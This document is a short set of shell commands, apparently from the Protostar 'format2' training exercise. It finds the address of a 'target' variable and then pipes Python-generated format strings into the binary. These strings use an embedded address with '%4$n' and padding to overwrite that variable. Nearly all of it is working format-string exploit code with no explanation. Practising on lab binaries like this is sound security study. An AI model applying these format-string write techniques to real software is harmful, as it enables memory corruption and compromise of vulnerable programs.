gdb -t format2 | grep target

python -c 'print "\xe4\x96\x04\x08" + "%4$n"' | ./format2
python -c 'print "\xe4\x96\x04\x08AAA" + "%4$n"' | ./format2
python -c 'print "\xe4\x96\x04\x08%60d" + "%4$n"' | ./format2
